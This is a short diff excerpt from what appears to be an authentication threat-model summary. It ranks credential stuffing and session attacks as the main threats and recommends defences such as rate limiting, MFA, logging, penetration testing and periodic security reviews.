+  Credential stuffing (AUTH-T001) is the most likely and impactful threat. Rate limiting,
+  MFA, and breach detection are mandatory mitigations.
+
+  Session security (AUTH-T002) requires strict cookie hardening and XSS prevention
+  (coordinate with COMM-T002).
+
+  All authentication events must be logged (AUTH-T004) for security monitoring and
+  compliance (GDPR, PCI DSS).
+
+  Regular penetration testing focused on authentication and authorization bypass is
+  essential. Consider bug bounty program with high payouts for auth vulnerabilities.
+
+  Quarterly security review of authentication controls recommended given criticality.
